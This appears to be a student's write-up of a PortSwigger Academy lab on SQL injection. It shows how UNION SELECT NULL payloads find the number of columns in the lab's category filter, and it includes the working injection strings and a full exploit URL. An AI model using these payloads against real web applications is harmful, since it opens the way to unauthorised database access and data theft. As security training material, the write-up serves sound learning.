# 📘 PortSwigger – SQL Injection UNION Attack (Determining Columns)

## 🧩 Challenge Information
- **Lab:** SQL injection UNION attack, determining the number of columns returned by the query  
- **Category:** Web Security  
- **Difficulty:** Easy  
- **Platform:** PortSwigger Academy  

---

## 📖 Description

This lab contains an **SQL injection vulnerability** in the product category filter.  
The query results are displayed in the application’s response, which means a **UNION attack** can be used to retrieve data from other tables.

The first step in such an attack is to **determine the number of columns** returned by the query.  
This will later be used in other SQLi UNION-based attacks to extract data.

---

## ⚙️ Steps to Solve

### 1️⃣ Inspect the vulnerable parameter
The URL parameter `category` is used in a SQL query:

/filter?category=Food


This parameter is likely inserted directly into an SQL query such as:
```sql
SELECT * FROM products WHERE category = 'Food';

2️⃣ Inject UNION SELECT payloads

To determine the number of columns, inject test payloads with increasing NULL values using the UNION SELECT clause until the query executes successfully.

Start with:
' UNION SELECT NULL--

If that fails, try increasing the number of NULLs:
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--

3️⃣ Identify success

When the query succeeds without an error, the number of NULLs you used equals the number of columns in the original query.

✅ In this lab, the payload that worked was:

' UNION SELECT NULL,NULL,NULL-- -

💻 Final URL Example

https://0aeb005203f4436385753fcf001f0086.web-security-academy.net/filter?category=Food'+UNION+SELECT+NULL,NULL,NULL--+-


Once submitted, the page loaded successfully and displayed the normal product list, indicating 3 columns in the query.
---

## 🖼 Proof of Solve

![Solved Screenshot](Screenshot%202025-11-30%20124300.png)



🧠 Why This Works

* The UNION keyword in SQL is used to combine the results of two or more queries.

* For UNION to work, both queries must return the same number of columns and compatible data types.

* Using NULL values helps find this match without knowing the data types in advance.

🎯 Takeaways

* Determining the column count is the first step in most UNION-based SQL injection attacks.

* Always use NULL as placeholder values to avoid data-type mismatches.

* Once the number of columns is known, you can move on to extracting data from the database in later labs.

